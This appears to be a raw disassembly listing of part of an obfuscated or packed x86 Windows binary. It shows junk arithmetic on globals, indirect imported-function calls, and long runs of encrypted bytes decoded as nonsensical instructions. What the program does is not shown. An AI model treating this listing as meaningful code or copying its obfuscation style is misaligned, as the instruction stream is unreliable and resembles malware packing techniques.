  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x4281a3,0x4283bf
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x4281bb,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x4282a7
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428347,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x4282c3,0x0
  417a53:	mov    DWORD PTR ds:0x42833f,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x4282b7,0x44f5
  417a72:	cmp    DWORD PTR ds:0x4282c3,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428e34
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428297,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428323
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x4281db,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281eb,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x4281af
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [ebx+esi*2-0x514f4256],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x6ca7e7e8],bh
  417b02:	mov    al,ds:0x685ed431
  417b07:	div    BYTE PTR [ebx+ebp*1]
  417b0a:	lods   al,BYTE PTR ds:[esi]
  417b0b:	fcomp  DWORD PTR [ebx+0x5b510587]
  417b11:	shl    BYTE PTR [edx],cl
  417b13:	test   al,0x59
  417b15:	inc    edx
  417b16:	or     BYTE PTR [eax+0x51],ah
  417b19:	inc    esi
  417b1a:	inc    edx
  417b1b:	mul    BYTE PTR [ebx+eiz*8]
  417b1e:	ret    
  417b1f:	pop    esp
  417b20:	jo     0x417b00
  417b22:	out    dx,eax
  417b23:	pop    esi
  417b24:	mov    ah,0x62
  417b26:	inc    edx
  417b27:	mov    ds:0xf8a3bb5f,eax
  417b2c:	(bad)  
  417b2e:	test   DWORD PTR [ebp-0x1927f423],0x871798c6
  417b38:	or     eax,0xf82b79f8
  417b3d:	sub    BYTE PTR [edx],bl
  417b3f:	push   es
  417b40:	adc    al,0x89
  417b42:	and    edx,ebp
  417b44:	jecxz  0x417b13
  417b46:	push   0x69
  417b48:	mov    DWORD PTR [ebx+0x769f6520],eax
  417b4e:	fnclex 
  417b50:	icebp  
  417b51:	icebp  
  417b52:	sub    ecx,ecx
  417b54:	add    eax,0x97d4c0f
  417b59:	shl    BYTE PTR [ebp+0x12],1
  417b5c:	xchg   ebp,eax
  417b5d:	mov    cl,0x6d
  417b5f:	scas   al,BYTE PTR es:[edi]
  417b60:	inc    ebp
  417b61:	out    0xed,eax
  417b63:	shl    BYTE PTR [ebp+0x77],1
  417b66:	pop    edx
  417b67:	sub    al,0x56
  417b69:	add    cl,cl
  417b6b:	mov    DWORD PTR [ebx],ebp
  417b6d:	mov    ebp,?
  417b6f:	(bad)  
  417b70:	jb     0x417b32
  417b72:	lds    edx,FWORD PTR [ebp+0x2a]
  417b75:	adc    dh,BYTE PTR [ebx+0x7fe90bcd]
  417b7b:	ins    DWORD PTR es:[edi],dx
  417b7c:	push   0xffffffab
  417b7e:	add    al,0x69
  417b80:	xchg   edi,eax
  417b81:	xor    ecx,esi
  417b83:	lods   al,BYTE PTR ds:[esi]
  417b84:	call   0xbf22:0x4b5bf697
  417b8b:	jp     0x417b81
  417b8d:	and    al,bl
  417b8f:	out    0x70,al
  417b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b92:	mov    DWORD PTR [edx+0x5d],esi
  417b95:	sbb    BYTE PTR [ebp-0x34],bh
  417b98:	lock pusha 
  417b9a:	jmp    0x417be4
  417b9c:	test   DWORD PTR [edx],0xc47d2cda
  417ba2:	cmp    al,0xaa
  417ba4:	or     eax,0xe446825f
  417ba9:	dec    eax
  417baa:	lahf   
  417bab:	jmp    0x850f:0xe46b03bd
  417bb2:	add    DWORD PTR [eax*8-0x3ecf14b5],ebx
  417bb9:	stos   BYTE PTR es:[edi],al
  417bba:	xchg   ebp,eax
  417bbb:	shl    BYTE PTR [esi+ecx*4+0x7b3bcb86],0xfb
  417bc3:	mov    BYTE PTR [edi+0x113b03fd],bl
  417bc9:	mov    ebp,0xfa0a5c13
  417bce:	xchg   edi,eax
  417bcf:	cwde   
  417bd0:	stos   DWORD PTR es:[edi],eax
  417bd1:	cmp    eax,ecx
  417bd3:	out    0xe9,al
  417bd5:	xor    edi,ebp
  417bd7:	xchg   esp,eax
  417bd8:	jmp    0x27fee879
  417bdd:	dec    edx
  417bde:	dec    esi
  417bdf:	test   eax,0xe4437295
  417be4:	and    ch,BYTE PTR ds:0x3df48987
  417bea:	not    BYTE PTR [edi+0x1eea5ed5]
  417bf0:	cmp    BYTE PTR [ebp-0x78],0x4a
  417bf4:	jle    0x417c1b
  417bf6:	mov    edx,ss
  417bf8:	shl    DWORD PTR [ecx+0x47a6b751],1
  417bfe:	xchg   DWORD PTR [esi+0x76],ebp
  417c01:	inc    ebx
  417c02:	lea    ecx,[ebp+0x6f3c4d38]
  417c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c09:	rol    BYTE PTR [eax],cl
  417c0b:	shl    esp,0x67
  417c0e:	retf   
  417c0f:	sahf   
  417c10:	lea    eax,[esi-0x2b]
  417c13:	add    al,0xbf
  417c15:	push   ebx
  417c16:	xlat   BYTE PTR ds:[ebx]
  417c17:	adc    eax,DWORD PTR [edx+edi*2-0x6815062a]
  417c1e:	sbb    BYTE PTR [ecx],cl
  417c20:	hlt    
  417c21:	repnz lods eax,DWORD PTR ds:[esi]
  417c23:	or     ecx,DWORD PTR [edi]
  417c25:	dec    ecx
  417c26:	jns    0x417c3d
  417c28:	leave  
  417c29:	adc    al,0x87
  417c2b:	xchg   ebx,eax
  417c2c:	ja     0x417c09
  417c2e:	out    0xb7,al
  417c30:	inc    ecx
  417c31:	pop    es
  417c32:	imul   ebp,edi,0xa41b77cb
  417c38:	call   0xaa307bef
  417c3d:	jmp    0x289c:0xa8cdbd3e
  417c44:	pop    ds
  417c45:	popa   
  417c46:	ret    
  417c47:	cmp    esp,DWORD PTR [ebp-0x2fa0a88e]
  417c4d:	lahf   
  417c4e:	xchg   esp,eax
  417c4f:	dec    edx
  417c50:	dec    ch
  417c52:	dec    edi
  417c53:	adc    al,0x7d
  417c55:	stos   BYTE PTR es:[edi],al
  417c56:	js     0x417c44
  417c58:	fimul  DWORD PTR [eax]
  417c5a:	xchg   esi,eax
  417c5b:	rol    DWORD PTR [esi+0x16401d5],0xb3
  417c62:	stc    
  417c63:	jo     0x417c9a
  417c65:	mov    esp,0xda5f9226
  417c6a:	push   ss
  417c6b:	pop    esi
  417c6c:	and    DWORD PTR [esi+0x6bb6359d],0xffffffad
  417c73:	cdq    
  417c74:	or     ebp,ecx
  417c76:	jge    0x417c86
  417c78:	lds    edx,FWORD PTR [ebx+eiz*1]
  417c7b:	sub    bl,ch
  417c7d:	lock fcom QWORD PTR [edi-0x79ba4e35]
  417c84:	mov    ecx,0x28b997c6
  417c89:	inc    edx
  417c8a:	mov    ch,0x70
  417c8c:	add    al,dl
  417c8e:	sub    al,0x4c
  417c90:	and    ebx,DWORD PTR [edi]
  417c92:	ss (bad) 
  417c94:	call   0x5e9bb868
  417c99:	and    DWORD PTR [edx-0x7d],0x93e026cd
  417ca0:	nop
  417ca1:	aam    0x18
  417ca3:	cli    
  417ca4:	mov    al,ds:0x3e8ff311
  417ca9:	mov    cl,0xc8
  417cab:	rol    BYTE PTR [ebx+edx*8],1
  417cae:	and    bl,BYTE PTR [edi-0x6cc28f37]
  417cb4:	sub    eax,0x85956fd4
  417cb9:	sahf   
  417cba:	sahf   
  417cbb:	sti    
  417cbc:	push   edx
  417cbd:	loop   0x417c92
  417cbf:	test   DWORD PTR [eax+ebp*2+0x71b8642d],eax
  417cc6:	(bad)  
  417cc7:	mov    ch,0x64
  417cc9:	das    
  417cca:	nop
  417ccb:	shr    BYTE PTR [ebp-0x16b556f8],0x8b
  417cd2:	xchg   DWORD PTR [esi+0x2748bb4],edi
  417cd8:	and    eax,0xecbe632c
  417cdd:	pop    edx
  417cde:	sub    eax,0x5a0e6c33
  417ce3:	test   al,0x8d
  417ce5:	mov    al,ds:0x40dd00fe
  417cea:	pop    ds
  417ceb:	lea    ecx,[edx]
  417ced:	lods   al,BYTE PTR ds:[esi]
  417cee:	adc    bl,bl
  417cf0:	and    bl,BYTE PTR [edi-0x35]
  417cf3:	push   ss
  417cf4:	call   0x32c936d
  417cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfa:	in     eax,0xd5
  417cfc:	and    DWORD PTR [ecx+esi*4+0x67],edx
  417d00:	add    eax,0xe8fb3d6b
  417d05:	sbb    al,BYTE PTR [ebx-0x79]
  417d08:	imul   DWORD PTR [eax]
  417d0a:	imul   eax,DWORD PTR [ecx-0x3f0fbb55],0xffffff8f
  417d11:	jge    0x417d1c
  417d13:	adc    ebp,esi
  417d15:	pusha  
  417d16:	in     al,0x56
  417d18:	pop    edi
  417d19:	loopne 0x417cbf
  417d1b:	cmp    BYTE PTR [edi-0x3305546e],cl
  417d21:	inc    edx
  417d22:	push   edi
  417d23:	adc    ebx,DWORD PTR [ecx-0x4]
  417d26:	adc    esp,edi
  417d28:	std    
  417d29:	pop    edi
  417d2a:	lea    eax,[edi-0x36]
  417d2d:	and    ebp,ebp
  417d2f:	xchg   edx,eax
  417d30:	mov    dl,0x98
  417d32:	mov    ss,WORD PTR [eax-0x1874338a]
  417d38:	lock mov al,ds:0xaf3a0cf1
  417d3e:	pop    ds
  417d3f:	stc    
  417d40:	ds cli 
  417d42:	jge    0x417dbc
  417d44:	or     DWORD PTR [ecx-0x66721501],esi
  417d4a:	add    dl,BYTE PTR [eax]
  417d4c:	and    ch,BYTE PTR [ebx+0x2b3c833d]
  417d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d53:	ror    DWORD PTR [edx],cl
  417d55:	pushf  
  417d56:	inc    esi
  417d57:	jl     0x417cde
  417d59:	mov    dh,0x75
  417d5b:	dec    edx
  417d5c:	cmp    DWORD PTR [ebp-0x1f],ecx
  417d5f:	jno    0x417cf3
  417d61:	fst    QWORD PTR [edi-0x59]
  417d64:	mov    eax,0x759f5718
  417d69:	dec    esi
  417d6a:	add    BYTE PTR [eax+edi*8+0xf],al
  417d6e:	dec    esp
  417d6f:	push   ebx
  417d70:	mov    DWORD PTR [ebp+0x45],ecx
  417d73:	add    esp,DWORD PTR [eax-0x7e9b072b]
  417d79:	inc    edi
  417d7a:	mov    eax,0x7f8fe016
  417d7f:	pop    eax
  417d80:	bound  esp,QWORD PTR [edi]
  417d82:	clc    
  417d83:	fbstp  TBYTE PTR [eax-0x5b]
  417d86:	fisttp WORD PTR [ecx]
  417d88:	jnp    0x417d2b
  417d8a:	pushf  
  417d8b:	xor    bl,BYTE PTR [ebp-0x36]
  417d8e:	test   BYTE PTR [ecx],bh
  417d90:	or     eax,0xa26993ed
  417d95:	int3   
  417d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d97:	dec    edx
  417d98:	mov    WORD PTR [edx+0xa595ebd],gs
  417d9e:	or     esi,DWORD PTR [ecx+eiz*1-0x53f68f78]
  417da5:	xadd   eax,eax
  417da8:	out    0xc8,al
  417daa:	hlt    
  417dab:	cli    
  417dac:	aad    0xc4
  417dae:	mov    ds:0x391c7b08,al
  417db3:	std    
  417db4:	data16 fstp QWORD PTR [ecx+0x2b3d3dd3]
  417dbb:	leave  
  417dbc:	inc    esi
  417dbd:	xor    ebp,edi
  417dbf:	bound  edi,QWORD PTR [edi+0x0]
  417dc2:	dec    edx
  417dc3:	pop    ss
  417dc4:	mov    ebx,0x18037dae
  417dc9:	arpl   WORD PTR [edx+eax*2+0x6c8530d7],si
  417dd0:	dec    edi
  417dd1:	sti    
  417dd2:	popf   
  417dd3:	jle    0x417e30
  417dd5:	cli    
  417dd6:	mov    edi,0xdace29be
  417ddb:	out    dx,eax
  417ddc:	cld    
  417ddd:	cmp    DWORD PTR [edx+0x10],esi
  417de0:	std    
  417de1:	inc    edi
  417de2:	push   esp
  417de3:	out    dx,eax
  417de4:	adc    al,0x9a
  417de6:	inc    eax
  417de7:	aad    0x7f
  417de9:	mov    ?,WORD PTR [edx+0x60]
  417dec:	(bad)
  417def:	int    0x54
  417df1:	mov    dh,0xaf
  417df3:	repnz inc ecx
  417df6:	call   0x90c7:0xbab333ee
  417dfd:	jmp    DWORD PTR [edx+edx*4+0x1947d7dd]
  417e04:	inc    esp
  417e05:	xor    DWORD PTR [ebp+0x2ded6820],0x6088792c
  417e0f:	lods   eax,DWORD PTR ds:[esi]
  417e10:	push   edi
  417e11:	jo     0x417e4b
  417e13:	push   edx
  417e14:	xor    ebp,esp
  417e16:	iret   
  417e17:	mov    edi,0xf8e6aeac
  417e1c:	fldcw  WORD PTR [ebx+0x11]
  417e1f:	ins    DWORD PTR es:[edi],dx
  417e20:	ds jmp 0x417e70
  417e23:	mov    ebp,edi
  417e25:	(bad)  
  417e26:	bound  ebx,QWORD PTR [edi]
  417e28:	sbb    al,0xaa
  417e2a:	pop    ebx
  417e2b:	nop
  417e2c:	or     ah,ah
  417e2e:	sbb    DWORD PTR [edi-0x27dea3bf],esp
  417e34:	xchg   esi,eax
  417e35:	mov    bh,0xf8
  417e37:	inc    ebp
  417e38:	sbb    esp,DWORD PTR [eax+ebx*8]
  417e3b:	cmp    DWORD PTR ds:0xef69ee8f,eax
  417e41:	aaa    
  417e42:	repnz adc ch,BYTE PTR [ebp+0x5b64bd7c]
  417e49:	dec    esi
  417e4a:	mov    BYTE PTR [esi+ebp*1-0x6a],bh
  417e4e:	ins    DWORD PTR es:[edi],dx
  417e4f:	and    edx,0x56
  417e52:	mov    bh,0x4
  417e54:	pop    es
  417e55:	jge    0x417e26
  417e57:	leave  
  417e58:	mov    DWORD PTR [esi-0x473fa102],edx
  417e5e:	adc    bh,0x1
  417e61:	dec    esp
  417e62:	(bad)  
  417e63:	aam    0xce
  417e65:	cmp    esp,0x58
  417e68:	xor    DWORD PTR [edx+0x7d8eba74],ecx
  417e6e:	fucomp st(6)
  417e70:	adc    dh,ah
  417e72:	xchg   esi,eax
  417e73:	loopne 0x417e3e
  417e75:	adc    BYTE PTR [esi-0x3448ff5c],al
  417e7b:	mov    ds:0xa7f72c25,al
  417e80:	xchg   BYTE PTR [eax-0x1c46702e],ah
  417e86:	inc    ebp
  417e87:	rol    al,0xb1
  417e8a:	inc    esi
  417e8b:	jo     0x417e27
  417e8d:	clc    
  417e8e:	xor    ecx,DWORD PTR [edx+0x17b92e65]
  417e94:	inc    edx
  417e95:	ret    
  417e96:	(bad)
  417e9a:	jecxz  0x417e36
  417e9c:	jge    0x417e9a
  417e9e:	out    0x56,eax
  417ea0:	xchg   edi,eax
  417ea1:	pop    edi
  417ea2:	mov    cl,0xfa
  417ea4:	js     0x417f06
  417ea6:	pop    ds
  417ea7:	ret    
  417ea8:	xor    DWORD PTR [edx-0x6f],ebx
  417eab:	xchg   edi,eax
  417eac:	sbb    al,0xbc
  417eae:	stos   BYTE PTR es:[edi],al
  417eaf:	repz sbb edi,DWORD PTR [edi+eax*8+0x44]
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x4283bf,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428283,0x4282db
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x4283d3,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x4282cf,0x1cb6
  417f20:	mov    DWORD PTR ds:0x4283cb,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x4283d3,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428ed8
  417f43:	sub    DWORD PTR ds:0x4282a7,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42828b
  417f53:	mov    ecx,DWORD PTR ds:0x4282eb
  417f59:	and    DWORD PTR ds:0x4281e7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x4283c3
  417f65:	mov    ecx,DWORD PTR ds:0x4281d7
  417f6b:	or     DWORD PTR ds:0x42836b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283ef
  417f77:	or     DWORD PTR ds:0x4282d7,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x33
  417f8f:	sbb    ch,ah
  417f91:	mov    esi,0x1816d953
  417f96:	mov    esp,0x59181812
  417f9b:	push   ebx
  417f9c:	pop    edi
  417f9d:	clc    
  417f9e:	fucomp st(1)
  417fa0:	popa   
  417fa1:	ins    BYTE PTR es:[edi],dx
  417fa2:	mov    WORD PTR [ebx],gs
  417fa4:	fadd   DWORD PTR [edi-0x37f1b308]
  417faa:	loope  0x417fdf
  417fac:	push   ebx
  417fad:	push   ecx
  417fae:	shl    DWORD PTR [eax+eiz*2+0x5d69ab7f],1
  417fb5:	fidivr WORD PTR [esi-0x4d3209e3]
  417fbb:	cli    
  417fbc:	int3   
  417fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fbe:	out    0x31,al
  417fc0:	ss addr16 mov dh,0x32
  417fc4:	add    bh,BYTE PTR [ecx]
  417fc6:	adc    ch,BYTE PTR [esp+esi*1]
  417fc9:	mov    BYTE PTR [ecx+0x3c9a6400],ch
  417fcf:	outs   dx,BYTE PTR ds:[esi]
  417fd0:	scas   al,BYTE PTR es:[edi]
  417fd1:	jle    0x417f92
  417fd3:	mov    ebx,0x745a4dbf
  417fd8:	jl     0x417fcd
  417fda:	nop
  417fdb:	sar    DWORD PTR [ecx],0xed
  417fde:	xchg   esp,eax
  417fdf:	mov    ecx,0xf464973c
  417fe4:	mov    BYTE PTR [edi],bh
  417fe6:	hlt    
  417fe7:	shr    BYTE PTR [edx-0x3],1
  417fea:	outs   dx,DWORD PTR ds:[esi]
  417feb:	jo     0x418061
  417fed:	cmp    esi,ecx
  417fef:	sbb    edx,eax
  417ff1:	out    dx,eax
  417ff2:	aam    0xf2
  417ff4:	(bad)  
  417ff5:	jmp    0x73a3:0x2669adba
  417ffc:	loopne 0x418074
  417ffe:	xor    cl,BYTE PTR [ebx]
  418000:	push   esp
  418001:	pop    esi
  418002:	adc    ah,BYTE PTR [eax]
  418004:	test   BYTE PTR [esi],bh
  418006:	inc    esp
  418008:	pop    ebx
  418009:	icebp  
  41800a:	pop    eax
  41800b:	pop    edx
  41800c:	push   edi
  41800d:	or     edi,DWORD PTR [edi-0x46983bc5]
  418013:	jge    0x418042
  418015:	outs   dx,BYTE PTR ds:[esi]
  418016:	jge    0x417fed
  418018:	nop
  418019:	xchg   edx,eax
  41801a:	test   al,0xef
  41801c:	out    0x28,al
  41801e:	sbb    eax,0xa4504b1d
  418023:	hlt    
  418024:	cmp    al,0xb0
  418026:	mov    al,0xbb
  418029:	push   cs
  41802a:	sbb    ebp,edx
  41802c:	jne    0x418035
  41802e:	enter  0x994f,0x48
  418032:	cmp    al,0xe5
  418034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418035:	mov    eax,0x2dd67e44
  41803a:	or     al,0x96
  41803c:	mov    ecx,0xd57dd3f4
  418041:	les    ebp,FWORD PTR [esi+0x397367b7]
  418047:	mov    esi,0x8c16a735
  41804c:	xchg   ecx,eax
  41804d:	mov    edi,DWORD PTR ds:0xac166829
  418053:	mov    al,ds:0x435714f3
  418058:	mov    eax,ds:0x72438e26
  41805d:	imul   esi,esp,0xc1848f38
  418063:	sub    eax,0xa9bcfa1
  418068:	aaa    
  418069:	cwde   
  41806a:	jo     0x417ffa
  41806c:	push   eax
  41806d:	imul   eax,ebx,0xffffffd0
  418070:	cmp    eax,ebx
  418072:	push   es
  418073:	mov    bh,0x5a
  418075:	in     al,dx
  418076:	mov    cl,0x7f
  418078:	sbb    eax,0x79250e28
  41807d:	ss mov cl,0xcb
  418080:	shr    DWORD PTR [eax],1
  418082:	sbb    DWORD PTR [eax+0x5e2334c1],edx
  418088:	pop    ds
  418089:	nop
  41808a:	cmp    al,0xb1
  41808c:	cmp    bl,BYTE PTR [ebp-0x49c8b71]
  418092:	call   0x3b0b:0x8ed7e42c
  418099:	mov    esi,0xc09d2a0c
  41809e:	hlt    
  41809f:	jae    0x41803d
  4180a1:	xchg   ecx,eax
  4180a2:	cmp    BYTE PTR [ecx+0x3c556e73],ch
  4180a8:	adc    DWORD PTR [edx+0x48],edx
  4180ab:	mov    ebp,0x18682199
  4180b0:	sbb    eax,0xfedcf40
  4180b5:	dec    esi
  4180b6:	imul   eax,eax,0x1745764c
  4180bc:	sub    dl,cl
  4180be:	leave  
  4180bf:	ret    
  4180c0:	(bad)  
  4180c1:	int3   
  4180c2:	xor    DWORD PTR ds:0x521c623e,esi
  4180c8:	sbb    BYTE PTR ds:0x84101de3,al
  4180ce:	int3   
  4180cf:	jmp    0x89f4d644
  4180d4:	es inc eax
  4180d6:	mov    cs,WORD PTR [edx-0x3]
  4180d9:	hlt    
  4180da:	fidiv  WORD PTR [ebx-0x75]
  4180dd:	loope  0x41807c
  4180df:	cmp    edi,DWORD PTR [edi+0x44]
  4180e2:	mov    ecx,esi
  4180e4:	push   ebx
  4180e5:	rol    DWORD PTR [esi],1
  4180e7:	fisub  DWORD PTR [edi-0x17]
  4180ea:	lea    esp,[ebx-0x74]
  4180ed:	daa    
  4180ee:	push   ebp
  4180ef:	xor    DWORD PTR [eax],ebp
  4180f1:	in     al,0x95
  4180f3:	jle    0x418079
  4180f5:	cmp    edx,edi
  4180f7:	cli    
  4180f8:	cmp    al,0x88
  4180fa:	imul   BYTE PTR [ecx+0x7730a2e7]
  418100:	push   0x568f319f
  418105:	inc    DWORD PTR ds:0x388ff428
  41810b:	dec    ecx
  41810c:	imul   ecx,esp,0x7d
  41810f:	xor    BYTE PTR [ecx+0x2d8da1db],dh
  418115:	cmp    eax,0xad45c004
  41811a:	js     0x4180ad
  41811c:	mov    esi,eax
  41811e:	fadd   st(1),st
  418120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418121:	mov    eax,ds:0x1758d97a
  418126:	loope  0x418159
  418128:	fadd   st(3),st
  41812a:	(bad)  
  41812b:	mov    ds:0x1cf6842a,eax
  418130:	bound  edx,QWORD PTR [ebp+ebx*2-0x71]
  418134:	pop    esi
  418135:	fs pop ebx
  418137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418138:	and    esi,ebp
  41813a:	mov    ebx,0x1e44efe9
  41813f:	mov    esp,DWORD PTR [edi]
  418141:	mov    ecx,0x68801ac7
  418146:	or     eax,0x914eb1d1
  41814b:	aas    
  41814c:	ror    al,1
  41814e:	adc    eax,DWORD PTR ds:0xa39ff0c9
  418154:	lahf   
  418155:	pop    esi
  418156:	xchg   BYTE PTR [eax],al
  418158:	jno    0x41819b
  41815a:	in     eax,0x19
  41815c:	jg     0x418144
  41815e:	cwde   
  41815f:	mov    ds:0x935e63ec,eax
  418164:	mov    eax,DWORD PTR [ecx+0x365a0474]
  41816a:	test   ch,dh
  41816c:	fcomp  QWORD PTR [ecx-0x3a]
  41816f:	repz inc ebx
  418171:	jecxz  0x418172
  418173:	push   ebx
  418174:	mov    bh,0xc3
  418176:	inc    esi
  418177:	repnz mov edx,0xdb878f98
  41817d:	(bad)  
  41817f:	int3   
  418180:	jl     0x4181f7
  418182:	das    
  418183:	lds    edx,FWORD PTR [edi+0x5fbbec20]
  418189:	dec    edx
  41818a:	inc    edx
  41818b:	jnp    0x41818f
  41818d:	mov    esp,0x480d3f1d
  418192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418193:	push   es
  418194:	and    BYTE PTR [edx],0x56
  418197:	in     eax,dx
  418198:	add    al,0xb1
  41819a:	pushf  
  41819b:	bound  ebx,QWORD PTR [edx]
  41819d:	add    ebp,DWORD PTR [edx+0x466a5e5b]
  4181a3:	and    ah,al
  4181a5:	into   
  4181a6:	hlt    
  4181a7:	lods   eax,DWORD PTR ds:[esi]
  4181a8:	jbe    0x41816e
  4181aa:	push   eax
  4181ab:	aam    0xf2
  4181ad:	cli    
  4181ae:	mov    ebp,DWORD PTR [edx+0x25]
  4181b1:	retf   0xe1ef
  4181b4:	jle    0x418162
  4181b6:	std    
  4181b7:	push   0x2d
  4181b9:	movsx  ebx,WORD PTR [esi+0x632c518b]
  4181c0:	mov    dh,cl
  4181c2:	xor    edi,DWORD PTR [ecx+0x4a]
  4181c5:	xor    ecx,DWORD PTR [edx+edx*8]
  4181c8:	pop    edx
  4181c9:	mov    ch,0x2e
  4181cb:	je     0x4181da
  4181cd:	jg     0x4181d7
  4181cf:	push   esp
  4181d0:	mov    cl,BYTE PTR [edx+0x2073f289]
  4181d6:	loope  0x418178
  4181d8:	or     BYTE PTR [edx+0x62],cl
  4181db:	jne    0x4181e4
  4181dd:	ds mov ebx,0x17e149d
  4181e3:	(bad)  
  4181e4:	loope  0x4181e1
  4181e6:	mov    edi,0xa0acb161
  4181eb:	push   0x333527a0
  4181f0:	aad    0x4d
  4181f2:	xchg   DWORD PTR [ecx-0x6f7679e5],ecx
  4181f8:	dec    edi
  4181f9:	mov    ds:0xd0df06e0,al
  4181fe:	loope  0x4181e4
  418200:	out    dx,al
  418201:	add    eax,esp
  418203:	jbe    0x4181fc
  418205:	cli    
  418206:	sti    
  418207:	sar    BYTE PTR ds:0xe88def1d,0x20
  41820e:	sti    
  41820f:	into   
  418210:	outs   dx,BYTE PTR ds:[esi]
  418211:	push   ss
  418212:	jl     0x4181fa
  418214:	(bad)  
  418215:	fdivr  QWORD PTR [ebx]
  418217:	mov    al,ds:0x390263b1
  41821c:	data16 adc BYTE PTR [ebx+edi*1+0x1a724608],0xda
  418225:	lock lds esp,FWORD PTR [ecx-0x70bf4f14]
  41822c:	mov    ebp,0x27ae9d06
  418231:	or     ah,BYTE PTR [esp+edx*8+0x3c]
  418235:	jb     0x4181ce
  418237:	ins    BYTE PTR es:[edi],dx
  418238:	hlt    
  418239:	ins    BYTE PTR es:[edi],dx
  41823a:	xlat   BYTE PTR ds:[ebx]
  41823b:	popa   
  41823c:	rol    DWORD PTR [esi-0x4b],0xf9
  418240:	loopne 0x418210
  418242:	arpl   WORD PTR [esi],bp
  418244:	and    ebp,DWORD PTR [edx+0x2c]
  418247:	dec    ebx
  418248:	mov    DWORD PTR [ebp+0x53b35726],eax
  41824e:	mov    bl,0xa7
  418250:	icebp  
  418251:	fbld   TBYTE PTR [ebp+0x7fd43eb2]
  418257:	dec    eax
  418258:	imul   ebp,DWORD PTR ss:[ecx],0x669117e7
  41825f:	mov    edi,0x9c0839e6
  418264:	pushf  
  418265:	inc    esp
  418266:	inc    ecx
  418267:	xchg   BYTE PTR [eax+0x302a6924],dl
  41826d:	pushf  
  41826e:	hlt    
  41826f:	(bad)  
  418270:	sub    dl,BYTE PTR [edi+0x3c509e57]
  418276:	xchg   ebx,eax
  418277:	test   eax,0x13eabcd6
  41827c:	lock repz aam 0x22
  418280:	push   eax
  418281:	ret    0xc
  418284:	xor    al,0x42
  418286:	fadd   DWORD PTR [edx+0x3640760a]
  41828c:	sar    dh,cl
  41828e:	lds    ecx,FWORD PTR [esi+ebp*2+0x2a]
  418292:	(bad)  
  418294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418295:	mov    esi,0x24d5fc9c
